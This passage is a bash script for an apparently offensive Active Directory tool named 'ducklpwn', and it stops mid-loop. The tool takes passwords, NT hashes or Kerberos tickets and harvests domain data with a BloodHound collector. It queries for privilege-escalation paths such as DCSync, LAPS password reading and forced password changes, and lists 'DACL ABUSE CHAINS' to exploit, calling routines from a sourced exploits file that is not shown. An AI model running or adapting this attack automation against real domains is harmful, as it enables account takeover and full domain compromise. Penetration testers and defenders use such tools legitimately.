#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/exploits.sh"
mkdir -p ./ducklpwn_files

# Define colors (non-bold versions)
WHITE='\033[0;37m'      # Abuse type
GREEN='\033[0;32m'      # Users
PURPLE='\033[0;35m'     # Computers
ORANGE='\033[0;33m'     # Groups
BLUE='\033[0;34m'       # OU
LIGHT_BLUE='\033[0;36m' # Domain
YELLOW='\033[1;33m'     # Messages
RED='\033[;91m'         # GPO
MAGENTA='\033[0;95m'    # GPOs (Light Magenta)
NC='\033[0m'            # No Color
GRAY='\033[0;90m'       # Gray for less important elements
BOLD='\033[1m'

cat << "EOF"
=============================================================
   ____  _     ____  _  __ _          ____  _      _     
  /  _ \/ \ /\/   _\/ |/ // \        /  __\/ \  /|/ \  /|
  | | \|| | |||  /  |   / | |   ____ |  \/|| |  ||| |\ ||
  | |_/|| \_/||  \__|   \ | |_/\____\|  __/| |/\||| | \||
  \____/\____/\____/\_|\_\\____/     \_/   \_/  \|\_/  \|
                                                          
  > Exploiting DACLs like a quacking pro!
      _          _          _          _          _
    >(')____,  >(')____,  >(')____,  >(')____,  >(') ____,
      (` =~~/    (` =~~/    (` =~~/    (` =~~/    (` =~~/
  ~^~^`---'~^~^~^`---'~^~^~^`---'~^~^~^`---'~^~^~^`---'~^~^~
=============================================================
EOF

usage(){
  echo -e "\n${BOLD}USAGE${NC}"
  echo -e "  ${YELLOW}./ducklpwn.sh [options]${NC}"
  echo -e ""
  echo -e "${BOLD}DESCRIPTION${NC}"
  echo -e "  Generates Bloodhound chains and exploits them automatically."
  echo -e ""

  echo -e "${BOLD}FLAGS${NC}"
  echo -e "  ${GREEN}-dc <DC_FQDN>${NC}        Domain Controller fully-qualified domain name (target scope for analysis)"
  echo -e "  ${GREEN}--dc-ip <DC_IP>${NC}      IP address of the name server or target host"
  echo -e "  ${GREEN}--no-gather${NC}          Skip collection; run analysis/automation on previously gathered/imported data"
  echo -e "  ${GREEN}-u <USER>${NC}            Username used for LDAP collection"
  echo -e "  ${GREEN}-p <PASSWORD>${NC}        Password for the user"
  echo -e "  ${GREEN}-H <HASH>${NC}            NTLM/LM hash for the user"
  echo -e "  ${GREEN}-k <TICKET_PATH>${NC}     Path to a Kerberos ticket file to use for authentication"
  echo -e "  ${GREEN}--all${NC}                Build attack chains for all possible users in the domain"
  echo -e "                           ${GRAY}(NOT recommended for large domains.)${NC}"
  echo -e "  ${GREEN}--owned <FILE>${NC}       Build attack chains for owned users listed in the specified file"
  echo -e "                           ${GRAY}(Specify UPN for users and FQDN for PCs)${NC}"
  echo -e "  ${GREEN}--owned${NC}              Build attack chains for users previously marked as owned in BloodHound"
  echo -e "  ${GREEN}-h, --help${NC}           Show this help text and exit"
  echo -e ""

  echo -e "${BOLD}EXAMPLES${NC}"
  echo -e "  ${GRAY}# Collect and ingest BloodHound data then run analysis for all users${NC}"
  echo -e "  ${YELLOW}ducklpwn -u alice -p 's3cr3t' -dc corp.local --dc-ip 10.0.0.5 --all${NC}"
  
  echo -e "  ${GRAY}# Collect and run analysis for specific owned users from file${NC}"
  echo -e "  ${YELLOW}ducklpwn -u alice -p 's3cr3t' -dc corp.local --dc-ip 10.0.0.5 --owned owned.txt${NC}"
  
  echo -e "  ${GRAY}# Collect and run analysis for users previously marked as owned in BloodHound${NC}"
  echo -e "  ${YELLOW}ducklpwn -u alice -p 's3cr3t' -dc corp.local --dc-ip 10.0.0.5 --owned${NC}"
  
  echo -e "  ${GRAY}# Run analysis using previously gathered data for all users${NC}"
  echo -e "  ${YELLOW}ducklpwn -dc corp.local --dc-ip 10.0.0.5 --no-gather --all${NC}"
  
  echo -e "  ${GRAY}# Run analysis using previously gathered data for owned users${NC}"
  echo -e "  ${YELLOW}ducklpwn -dc corp.local --dc-ip 10.0.0.5 --no-gather --owned owned.txt${NC}"
  
  echo -e "  ${GRAY}# Run analysis using previously gathered data for BloodHound marked owned users${NC}"
  echo -e "  ${YELLOW}ducklpwn -dc corp.local --dc-ip 10.0.0.5 --no-gather --owned${NC}"

  exit 0
}

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENV_FILE="$SCRIPT_DIR/.env"

if [ -f "$ENV_FILE" ]; then
  # shellcheck disable=SC1090
  . "$ENV_FILE"
  echo -e "${GRAY}[+] Loaded .env configuration from $ENV_FILE${NC}"
else
  echo -e "[-] Warning: .env file not found at $ENV_FILE"
fi
USERNAME=""
PASSWORD=""
HASH=""
KB=""
NO_GATHER=false
DC_FQDN=""
DC_IP=""
ALL_FLAG=false
OWNED_FLAG=false
OWNED_FILE=""

# Use RAM disk if available for temp files
TMP_DIR="/dev/shm"
if [[ ! -d "$TMP_DIR" ]]; then
    TMP_DIR="/tmp"
fi

# Parse command-line arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        -u)
            if [ -n "$2" ]; then
                USERNAME="$2"
                shift 2
            else
                echo -e "${RED}[-] ERROR: Empty User Provided${NC}"
                usage
            fi
            ;;
        -dc)
            if [ -n "$2" ]; then
                DC_FQDN="$2"
                shift 2
            else
                echo -e "${RED}[-] ERROR: Empty DC FQDN Provided${NC}"
                usage
            fi
            ;;
        --dc-ip)
            if [ -n "$2" ]; then
                DC_IP="$2"
                shift 2
            else
                echo -e "${RED}[-] ERROR: Empty DC IP Provided${NC}"
                usage
            fi
            ;;
        -p)
            if [ -n "$2" ]; then
                PASSWORD="$2"
                shift 2
            else
                echo -e "${RED}[-] ERROR: Empty Password Provided${NC}"
                usage
            fi
            ;;
        -H)
            if [ -n "$2" ]; then
                HASH="$2"
                shift 2
            else
                echo -e "${RED}[-] ERROR: Empty Hash Provided${NC}"
                usage
            fi
            ;;
        -k)
            if [ -n "$2" ]; then
                KB="$2"
                shift 2
            else
                echo -e "${RED}[-] ERROR: Empty Kerberos Ticket${NC}"
                usage
            fi
            ;;
        --no-gather)
            NO_GATHER=true
            shift
            ;;
        --all)
            ALL_FLAG=true
            shift
            ;;
        --owned)
            OWNED_FLAG=true
            if [ -n "$2" ]; then
                OWNED_FILE="$2"
                shift 2
            else
                echo -e "${YELLOW}[*] Have you manually marked the users as owned on Bloodhound? Otherwise input a file${NC}"
                shift 1
            fi
            ;;
        -h|--help)
            usage
            ;;
        *)
            usage
            ;;
    esac
done

# ---------- Validation logic ----------

# Validate --all and --owned mutual exclusivity
if [ "$ALL_FLAG" = true ] && [ -n "$OWNED_FILE" ]; then
    echo -e "${RED}[-] ERROR: Cannot use both --all and --owned flags together${NC}"
    usage
    exit 1
fi

if [ "$ALL_FLAG" = false ] && [ "$OWNED_FLAG" = false ]; then
    echo -e "${RED}[-] ERROR: You must specify either --all or --owned (with or without file)${NC}"
    usage
    exit 1
fi

if $NO_GATHER; then
    # --no-gather mode validation
    if [ -n "$USERNAME" ]; then
        echo -e "${RED}[-] ERROR: --no-gather cannot be used with -u/--username${NC}"
        usage
        exit 1
    fi
    if [ -z "$DC_FQDN" ] || [ -z "$DC_IP" ]; then
        echo -e "${RED}[-] ERROR: --no-gather requires both -dc and --dc-ip${NC}"
        usage
        exit 1
    fi
else
    # Normal operation mode validation
    if [ -z "$USERNAME" ] || [ -z "$DC_FQDN" ] || [ -z "$DC_IP" ]; then
        echo -e "${RED}[-] ERROR: You must provide -u, -dc, and --dc-ip when gathering${NC}"
        usage
        exit 1
    else
        if [ -z "$PASSWORD" ] && [ -z "$HASH" ] && [ ! -s "$KB" ]; then
            echo -e "${RED}[-] ERROR: You must provide at least one of -p (password), -H (hash), or -k (kerberos)${NC}"
            usage
            exit 1
        fi
    fi
fi

authenticate_user() {
    local AUTH_USER="$1"
    local DC_FQDN="$2"
    
    while true; do
        echo -e "${YELLOW}[?] Choose authentication method for $AUTH_USER:${NC}"
        echo -e "  1) Password"
        echo -e "  2) NT hash"
        echo -e "  3) Kerberos ticket file"
        read -erp "Select option (1-3): " auth_method </dev/tty
        
        case $auth_method in
            1)
                read -erp "[?] Enter password for $AUTH_USER: " password </dev/tty
                echo
                get_ticket "$DC_FQDN" -u "$AUTH_USER" -p "$password"
                if [ $? -eq 0 ]; then break; fi
                ;;
                
            2)
                while true; do
                    read -erp "[?] Enter NT hash for $AUTH_USER (32 chars): " nt_hash </dev/tty
                    if [[ "$nt_hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
                        get_ticket "$DC_FQDN" -u "$AUTH_USER" -H "$nt_hash"
                        if [ $? -eq 0 ]; then break 2; fi
                        break
                    else
                        echo -e "[-] Invalid hash format. Must be 32-character hex string."
                    fi
                done
                ;;
                
            3)
                while true; do
                    read -erp "[?] Enter path to Kerberos ticket file: " ticket_file </dev/tty
                    if [[ ! -f "$ticket_file" ]]; then
                        echo -e "[-] File does not exist: $ticket_file"
                        break
                    fi
                    
                    if [[ ! -s "$ticket_file" ]]; then
                        echo -e "[-] Ticket file is empty: $ticket_file"
                        break
                    fi
                    
                    # Clean the source name for filename
                    auth_user_clean=$(echo -e "$AUTH_USER" | sed -e 's/\x1b\[[0-9;]*m//g')
                    cp "$ticket_file" "./${auth_user_clean}.ccache"
                    cp "$ticket_file" "./${auth_user_clean,,}.ccache"
                    
                    export KRB5CCNAME="$ticket_file"
                    if klist; then
                        break 2
                    else
                        echo -e "[-] The provided ticket file is invalid or expired"
                        break
                    fi
                done
                ;;
                
            *)
                echo -e "[-] Invalid selection. Please choose 1, 2, or 3."
                ;;
        esac
        
        echo -e "[-] Authentication failed. Please try again.\n"
    done
}

authenticate_group_member() {
    local source="$1"
    local DC_FQDN="$2"
    
    while true; do
        # Ask for username - use $source (the group name) in prompt
        read -erp $'[?] Enter username for a member of '"${source}"$'\e[0m: ' username </dev/tty
        # Convert to uppercase but preserve existing $ if present
        if [[ "$username" == *\$ ]]; then
            SRC=$(echo "${username%\$}" | tr '[:lower:]' '[:upper:]')"\$"
        else
            SRC=$(echo "$username" | tr '[:lower:]' '[:upper:]')
        fi
        
        # Authentication menu
        echo "[?] Choose authentication method for $SRC:"
        echo "  1) Password"
        echo "  2) NT hash"
        echo "  3) Kerberos ticket file (avoid if privileges need to be updated)"
        read -erp "Select option (1-3): " auth_method </dev/tty
        
        case $auth_method in
            1)
                read -erp "[?] Enter password for $SRC: " password </dev/tty
                echo
                get_ticket "$DC_FQDN" -u "$SRC" -p "$password"
                [ $? -eq 0 ] && break
                ;;
            2)
                while true; do
                    read -erp "[?] Enter NT hash for $SRC (32 chars): " nt_hash </dev/tty
                    if [[ "$nt_hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
                        get_ticket "$DC_FQDN" -u "$SRC" -H "$nt_hash"
                        [ $? -eq 0 ] && break 2
                        break
                    else
                        echo "[-] Invalid hash format. Must be 32-character hex string."
                    fi
                done
                ;;
            3)
                while true; do
                    read -erp "[?] Enter path to Kerberos ticket file: " ticket_file </dev/tty
                    if [[ -f "$ticket_file" && -s "$ticket_file" ]]; then
                        cp "$ticket_file" "./${USER}.ccache"
                        export KRB5CCNAME="$ticket_file"
                        klist && break 2 || echo "[-] Invalid/expired ticket file"; break
                    else
                        echo "[-] Invalid ticket file"
                        break
                    fi
                done
                ;;
            *)
                echo "[-] Invalid selection. Please choose 1, 2, or 3."
                ;;
        esac
        echo -e "[-] Authentication failed. Please try again.\n"
    done
}

colorize_kind() {
    local kind="$1"
    case "$kind" in
        "User") echo -e "${GREEN}(${kind})${NC}" ;;
        "Computer") echo -e "${PURPLE}(${kind})${NC}" ;;
        "Group") echo -e "${ORANGE}(${kind})${NC}" ;;
        "Domain") echo -e "${LIGHT_BLUE}(${kind})${NC}" ;;
        "OU") echo -e "${BLUE}(${kind})${NC}" ;;
        "GPO") echo -e "${RED}${label}${NC}" ;;
        *) echo -e "(${kind})" ;;  # Default no color for other types
    esac
}

colorize_label() {
    local label="$1"
    local kind="$2"
    case "$kind" in
        "User") echo -e "${GREEN}${label}${NC}" ;;
        "Computer") echo -e "${PURPLE}${label}${NC}" ;;
        "Group") echo -e "${ORANGE}${label}${NC}" ;;
        "Domain") echo -e "${LIGHT_BLUE}${label}${NC}" ;;
        "OU") echo -e "${BLUE}${label}${NC}" ;;
        "GPO") echo -e "${RED}${label}${NC}" ;;
        *) echo -e "${label}" ;;  # Default no color for other types
    esac
}

align_ad_relationships() {
    # Read input from file or stdin
    input=$(cat "$1" 2>/dev/null || cat)

    # Calculate maximum lengths for alignment
    max_source_len=0
    max_op_len=0
    while IFS= read -r line; do
        # Extract components
        source_part=$(echo -e "$line" | awk -F'---' '{print $1}' | sed 's/ *$//')
        op_part=$(echo -e "$line" | awk -F'---|-->' '{print $2}' | sed 's/ *$//')
        
        # Update maximum lengths
        (( ${#source_part} > max_source_len )) && max_source_len=${#source_part}
        (( ${#op_part} > max_op_len )) && max_op_len=${#op_part}
    done <<< "$input"

    # Generate aligned output
    while IFS= read -r line; do
        source_part=$(echo -e "$line" | awk -F'---' '{print $1}' | sed 's/ *$//')
        op_part=$(echo -e "$line" | awk -F'---|-->' '{print $2}' | sed 's/ *$//')
        target_part=$(echo -e "$line" | awk -F'--> ' '{print $2}')
        
        printf "%-*s---%-*s--> %s\n" \
            "$max_source_len" "$source_part" \
            "$max_op_len" "$op_part" \
            "$target_part"
    done <<< "$input"
}

color_to_obj() {
    local input="$1"
    
    # Check for color codes and return corresponding type
    if [[ "$input" == *$'\033[0;32m'* ]]; then
        echo -e "User"
    elif [[ "$input" == *$'\033[0;35m'* ]]; then
        echo -e "Computer"
    elif [[ "$input" == *$'\033[0;33m'* ]]; then
        echo -e "Group"
    elif [[ "$input" == *$'\033[0;34m'* ]]; then
        echo -e "OU"
    elif [[ "$input" == *$'\033[0;36m'* ]]; then
        echo -e "Domain"
    elif [[ "$input" == *$'\033[0;91m'* ]]; then
        echo -e "GPO"
    elif [[ "$input" == *$'\033[0;37m'* ]]; then
        echo -e "ACL"
    else
        echo -e "Unknown"
        echo -e "${RED}Error in detecting type for $input ${NC}" >/dev/tty
    fi
}

# Dumps and Ingest the Domain ZIP File
domain=${DC_FQDN#*.}
flt_domain=${domain^^}

if [[ ! -z $PASSWORD ]]; then
    get_ticket $DC_FQDN -u $USERNAME -p $PASSWORD
    if [[ $? -ne 0 ]]; then
        echo -e "[-] Ticket generation failed. Check your credentials"
        exit 1
    fi
    export KRB5CCNAME="./${USERNAME}.ccache"
 

elif [[ ! -z $HASH ]]; then
    get_ticket $DC_FQDN -u $USERNAME -H $HASH
    if [[ $? -ne 0 ]]; then
        echo -e "[-] Ticket generation failed. Check your credentials"
        exit 1
    fi
    export KRB5CCNAME="./${USERNAME}.ccache"


elif [[ ! -z $KB ]]; then
    if [[ ! -s $KB ]]; then
        echo -e "[-] Cannot find ticket \"$KB\""
        exit 1
    fi
    export KRB5CCNAME=$KB
    echo -e "\n-----------LOADED TICKET FOR \"$USERNAME\"----------------"
    klist
fi

if [[ $NO_GATHER == true ]]; then
    echo -e "\n-------------SKIPPING LDAP INGESTION FOR \"${flt_domain}\"--------------"
else
    echo -e "\n---------------GATHERING LDAP DATA FROM DC----------------"
    if [[ ! -z $PASSWORD ]]; then
        zip_file=$(nxc ldap "$DC_FQDN" -u $USERNAME -p $PASSWORD --dns-server "$DC_IP" --dns-tcp --dns-timeout 30 --bloodhound --collection All | grep "\.zip" | awk '{print $8}')
    elif [[ ! -z $HASH ]]; then
        zip_file=$(nxc ldap "$DC_FQDN" -u $USERNAME -H $HASH --dns-server "$DC_IP" --dns-tcp --dns-timeout 30 --bloodhound --collection All | grep "\.zip" | awk '{print $8}')
    else
        zip_file=$(nxc ldap "$DC_FQDN" --use-kcache --dns-server "$DC_IP" --dns-tcp --dns-timeout 30 --bloodhound --collection All | grep "\.zip" | awk '{print $8}')
    fi


    echo -e "\n-----------EXTRACTED ZIP DATA \"$zip_file\"------------\n"
    if [[ ! -s $zip_file ]]; then
        echo -e "Error while extracting LDAP data, try changing collection methods or DNS settings"
        echo -e "EXECUTED COMMAND -> \"nxc ldap $DC_FQDN --use-kcache --dns-server $DC_IP --bloodhound --dns-tcp --dns-timeout 30 --collection All\""
        exit 1
    fi
fi

# Starts the BH API if not listening
stat=$(curl -s -o /dev/null -w "%{http_code}" $BH_URL/api/v2/login)
if [[ $stat != "405" ]]; then
    echo -e "\n[*] Starting Bloodhound API..."
    $bd_cli containers start
fi

# Authenticates to the BH API if not previously authenticated
if [[ ! -s /home/$USER/.config/bhcli/bhcli.ini ]]; then
    echo -e "\n------------TOKEN NOT FOUND, PLEASE AUTHENTICATE TO BLOODHOUND---------"
    bhcli auth $BH_URL
fi

# Get JWT token
TOKEN=$(curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"'"$BH_USER"'","secret":"'"$BH_PASS"'","login_method":"secret"}' \
  $BH_URL/api/v2/login | jq -r '.data.session_token')

# Check if token retrieval was successful
if [ -z "$TOKEN" ] || [ "$TOKEN" = "null" ]; then
    echo -e "[-] ERROR: Failed to get authentication token, invalid credentials or Bloodhound not running"
    exit 1
fi


if [[ $NO_GATHER == false ]]; then
    echo -e "\n[*] Uploading ZIP file to Bloodhound API..."
    timeout 300 bhcli upload $zip_file
    exit_code=$?

    if [[ $exit_code -eq 124 ]]; then
        echo -e "\n[-] ERROR: Upload timed out after 5 minutes, try to re-authenticate to ingest the file"
        exit 1
    elif [[ $exit_code -ne 0 ]]; then
        echo -e "\n[-] ERROR: Upload failed with exit code $exit_code."
        exit 1
    fi
fi

show_progress() {
    local current=$1
    local total=$2
    local width=50
    local percentage=$((current * 100 / total))
    local completed=$((current * width / total))
    local remaining=$((width - completed))
    
    printf "\r[%-*s] %d%%" "$width" "$(printf '#%.0s' $(seq 1 $completed))" "$percentage"
}


# Process chains with progress
process_with_progress() {
    local input_file="$1"
    local total_lines=$(wc -l < "$input_file")
    local count=0
    
    while IFS= read -r line; do
        ((count++))
        show_progress "$count" "$total_lines"
        # Process line
    done < "$input_file"
    echo  # New line after progress
}

show_color_legend() {
    echo -e "\n${BOLD}LEGEND:${NC}"
    echo -e "──────────────────────────"
    echo -e "|${GREEN}Users${NC}           "
    echo -e "|${PURPLE}Computers${NC}       "
    echo -e "|${ORANGE}Groups${NC}          "
    echo -e "|${BLUE}OUs${NC}             "
    echo -e "|${LIGHT_BLUE}Domains${NC}"
    echo -e "|${RED}GPOs${NC}         "
    echo -e "|${WHITE}ACL${NC}"  
    echo -e "──────────────────────────"
}

# Getting statistics
bhcli stats -d $domain

# Launch DACL Query
show_color_legend
if $ALL_FLAG; then
    # Original comprehensive query with all filtering
    DACL_JSON=$(curl -s "$BH_URL/api/v2/graphs/cypher" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"query\":\"MATCH p=shortestPath((s)-[:Owns|GenericAll|WriteGPLink|MemberOf|GPOAppliesTo|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights|AddMember|HasSession|AllowedToDelegate|CoerceToTGT|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions*1..]->(t)) WHERE NOT COALESCE(s.system_tags, '') CONTAINS 'admin_tier_0' AND (s:User OR s:Computer) AND (t:User OR t:Computer OR (t:Group AND NOT t.objectid =~ '.*-(581|578|568|554|498|558|552|521|553|557|561|513|582|579|575|571|559|577|576|517|1102|522|569|574|545|515|572|560|556)$' AND NOT t.distinguishedname =~ '.*EXCHANGE INSTALL DOMAIN.*') OR t:OU OR t:Domain) AND NOT (t.distinguishedname =~ '.*(EXCHANGE ONLINE-APPLICATION|GUEST|DEFAULTACCOUNT|SYSTEMMAILBOX|DISCOVERYSEARCHMAILBOX|FEDERATEDEMAIL|HEALTHMAILBOX|MIGRATION).*') AND s<>t AND s.domain = '${flt_domain}' RETURN p\"}")
else
    if [[ -n "$OWNED_FILE" ]]; then
        echo -e "[*] Marking owned users from file: $OWNED_FILE"
        bhcli mark owned --file "$OWNED_FILE" | grep -v 'already marked as owned'
    fi
    # Owned users query with the same comprehensive filtering
    DACL_JSON=$(curl -s "$BH_URL/api/v2/graphs/cypher" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"query\":\"MATCH p=shortestPath((s)-[:Owns|GenericAll|WriteGPLink|MemberOf|GPOAppliesTo|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights|AddMember|HasSession|AllowedToDelegate|CoerceToTGT|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions*1..]->(t)) WHERE (s:User OR s:Computer) AND (t:User OR t:Computer OR (t:Group AND NOT t.objectid =~ '.*-(581|578|568|554|498|558|552|521|553|557|561|513|582|579|575|571|559|577|576|517|1102|522|569|574|545|515|572|560|556)$' AND NOT t.distinguishedname =~ '.*EXCHANGE INSTALL DOMAIN.*') OR t:OU OR t:Domain) AND NOT (t.distinguishedname =~ '.*(EXCHANGE ONLINE-APPLICATION|GUEST|DEFAULTACCOUNT|SYSTEMMAILBOX|DISCOVERYSEARCHMAILBOX|FEDERATEDEMAIL|HEALTHMAILBOX|MIGRATION).*') AND s<>t AND ANY(tag IN s.system_tags WHERE tag = 'owned') AND s.domain = '${flt_domain}' RETURN p\"}")
fi
echo -e "\n${GRAY}[*] Query executed, parsing it..."

DACL=$(echo -e "$DACL_JSON" | jq -r '
  .data as $data |
  $data.edges[] |
  {
    source: $data.nodes[.source],
    target: $data.nodes[.target],
    label: .label
  } |
  "\(.source.label)|\(.source.kind)|\(.target.label)|\(.target.kind)|\(.label)"
' | while IFS="|" read -r source_label source_kind target_label target_kind abuse_type; do
    # Colorize the source label (name) based on its kind
    colored_source_label="$(colorize_label "$source_label" "$source_kind")"
    colored_target_label="$(colorize_label "$target_label" "$target_kind")"
    
    # Keep the kind indicators colored
    colored_source_kind="$(colorize_kind "$source_kind")"
    colored_target_kind="$(colorize_kind "$target_kind")"
    
    # Format the output line (colored names, colored kinds, red abuse type)
    echo -e "${colored_source_label} ---${WHITE}${abuse_type}${NC}--> ${colored_target_label}BREAK"
done)

if [[ ! -z $DACL ]]; then
    echo -e "[*] Building attack chains..."
    start_time=$(date +%s)
    
    # Parse and prepare DACL data - handle domain suffixes properly
    echo -e "$DACL" | sed 's/BREAK /\n/g' | sed 's/BREAK//g' | sed "s/@${flt_domain}//g" | sed "s/\.${flt_domain}//g" | sed 's/[[:space:]]*$//' | sort -u > ./DACL_${flt_domain}
    
    echo -e "[*] Processed $(wc -l < "./DACL_${flt_domain}") unique relationships"

    # Only align if we have relationships
    if [[ -s "./DACL_${flt_domain}" ]]; then
        align_ad_relationships "./DACL_${flt_domain}" > ./DACL_ALIGN_${flt_domain} && mv ./DACL_ALIGN_${flt_domain} ./DACL_${flt_domain}
    else
        echo -e "[-] No relationships found after parsing DACL data"
        exit 1
    fi

    "$SCRIPT_DIR/make_chains.py" "./DACL_${flt_domain}" | sort > "DACL_ABUSE_${flt_domain}.txt"

    end_time=$(date +%s)
    echo -e "${GRAY}[+] Chain building completed in $((end_time - start_time)) seconds${NC}"
    
    # FIXED FILTERING LOGIC - PROPERLY SEPARATE PURE MEMBERSHIP CHAINS

    # Account operators domain paths - JUST FOR DISPLAY, DON'T REMOVE
    if [[ -s "DACL_ABUSE_${flt_domain}.txt" ]]; then
        account_ops_chains=$(cat DACL_ABUSE_${flt_domain}.txt | grep "ACCOUNT OPERATORS" --color=never | grep ${flt_domain} --color=never)
        if [[ -n "$account_ops_chains" ]]; then
            echo -e "ACCOUNT OPERATORS MEMBERS FOUND! THIS GROUP HAS GENERIC-ALL ON ALL ACCOUNTS AND GROUPS"
        fi
    fi

    # Extract PURE MemberOf chains (chains that contain ONLY MemberOf relationships)
    if [[ -s "DACL_ABUSE_${flt_domain}.txt" ]]; then
        # First, create a temporary file with chains that contain ONLY MemberOf
        grep -E "^[^-]*( ---MemberOf--> [^-]*)*$" "DACL_ABUSE_${flt_domain}.txt" | grep -vE "GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights|AddMember|HasSession|GPLink|AllowedToDelegate|CoerceToTGT|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|WriteGPLink|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|GPOAppliesTo|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|SyncedToEntraUser|CoerceAndRelayNTLMToSMB|CoerceAndRelayNTLMToADCS|WriteOwnerLimitedRights|OwnsLimitedRights|DCFor" > GRPS_${flt_domain}.txt
    fi

    # Remove chains that end with MemberOf (they don't lead to actual privileges)
    if [[ -s "DACL_ABUSE_${flt_domain}.txt" ]]; then
        awk '!/---MemberOf--> [^---]*$/' "DACL_ABUSE_${flt_domain}.txt" > t
        removed_count=$(($(wc -l < "DACL_ABUSE_${flt_domain}.txt") - $(wc -l < t)))
        if [[ $removed_count -gt 0 ]]; then
            echo -e "[+] Removed $removed_count chains that end with MemberOf"
        fi
        mv t "DACL_ABUSE_${flt_domain}.txt"
    fi
fi


grep -oP '\x1b\[0;34m\K[^\x1b]*(?=\x1b\[0m)' DACL_ABUSE_${flt_domain}.txt --color=never > ./OU_TARGETS_${flt_domain}.txt
if [[ -s ./OU_TARGETS_${flt_domain}.txt ]]; then
    OU_JSON=$(curl -s "$BH_URL/api/v2/graphs/cypher" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"query\":\"MATCH p=shortestPath((s)-[:Contains*1..]->(t)) \\nWHERE s:OU and (t:User or t:Group or t:Computer) \\nAND s<>t AND s.domain = \\\"${flt_domain}\\\"\\nRETURN p\"}")
    OU=$(echo -e "$OU_JSON" | jq -r '
    .data as $data |
    $data.edges[] |
    {
        source: $data.nodes[.source],
        target: $data.nodes[.target],
        label: .label
    } |
    "\(.source.label)|\(.source.kind)|\(.target.label)|\(.target.kind)|\(.label)"
    ' | while IFS="|" read -r source_label source_kind target_label target_kind abuse_type; do
        # Colorize the source label (name) based on its kind
        colored_source_label="$(colorize_label "$source_label" "$source_kind")"
        colored_target_label="$(colorize_label "$target_label" "$target_kind")"
    
        # Keep the kind indicators colored
        colored_source_kind="$(colorize_kind "$source_kind")"
        colored_target_kind="$(colorize_kind "$target_kind")"
    
        # Format the output line (colored names, colored kinds, red abuse type)
        echo -e "${colored_source_label} ---${WHITE}${abuse_type}${NC}--> ${colored_target_label}BREAK"
    done)

    if [[ ! -z $OU ]]; then
        # Read input from file or stdin
        echo $OU | sed 's/BREAK /\n/g' | sed 's/BREAK//g' | sed "s/@${flt_domain}//g" | sed "s/\.${flt_domain}/\$/g" | sort -u > ./OU_${flt_domain}
        align_ad_relationships "./OU_${flt_domain}" > ./OU_ALIGN_${flt_domain} && mv ./OU_ALIGN_${flt_domain} ./OU_${flt_domain}
        "$SCRIPT_DIR/make_chains.py" ./OU_${flt_domain} | sort > OU_ABUSE_${flt_domain}.txt
        grep -F -f ./OU_TARGETS_${flt_domain}.txt OU_ABUSE_${flt_domain}.txt > t; mv t OU_ABUSE_${flt_domain}.txt
        if [[ -s OU_ABUSE_${flt_domain}.txt ]]; then
            echo -e "\n---------OU CHILD OBJECTS----------"
            awk -F ' ---' '
            {
                # Extract the starting node (first part before "---")
                start_node = $1;
    
                # Store all paths by their starting node
                paths[start_node] = paths[start_node] $0 "\n";
            }
            END {
                # Print all paths grouped by starting node with spacing
                first_group = 1;
                for (node in paths) {
                    if (!first_group) {
                        print "";  # Add empty line between groups
                    }
                    printf "%s", paths[node];
                    first_group = 0;
                }
            }' "OU_ABUSE_${flt_domain}.txt"
        fi
    fi
fi
input_file="DACL_ABUSE_${flt_domain}.txt"

# Verify file exists and is readable
if [ ! -f "$input_file" ] || [ ! -r "$input_file" ]; then
    echo -e "[-] ERROR: Cannot read file '$input_file'"
    exit 1
fi

# Read chains from file into array (ignoring empty/commented lines)
readarray -t chains < <(grep -v -e '^$' -e '^#' "$input_file")

# Check if we got any chains
if [ ${#chains[@]} -eq 0 ]; then
    echo -e "[-] ERROR: No valid chains found in file"
    exit 1
fi

# Extract unique starting points
get_unique_sources() {
    declare -A sources
    for chain in "${chains[@]}"; do
        # Extract first node (handles chains starting with special characters)
        source_node=$(echo -e "$chain" | awk '{print $1}')
        sources["$source_node"]=1
    done
    printf '%s\n' "${!sources[@]}" | sort
}

# --------------------------------------Main menu - simplified version

# Read all chains into an array (with colors preserved)
readarray -t all_chains < "DACL_ABUSE_${flt_domain}.txt"

# Check if we have any chains
if [ ${#all_chains[@]} -eq 0 ]; then
    echo -e "${RED}[-] ERROR: No valid chains found in file${NC}"
    exit 1
fi

# Display pure membership chains first (information only)
if [[ -s GRPS_${flt_domain}.txt ]]; then
    echo -e "\n${BOLD}${YELLOW}PURE MEMBERSHIP CHAINS (Information Only)${NC}"
    echo -e "=========================================================="
    cat GRPS_${flt_domain}.txt
fi

# Display DACL abuse chains with numbers and colors
if [[ -s DACL_ABUSE_${flt_domain}.txt ]]; then
    echo -e "\n${BOLD}${YELLOW}DACL ABUSE CHAINS (Select to Exploit)${NC}"
    echo -e "=========================================================="
    for i in "${!all_chains[@]}"; do
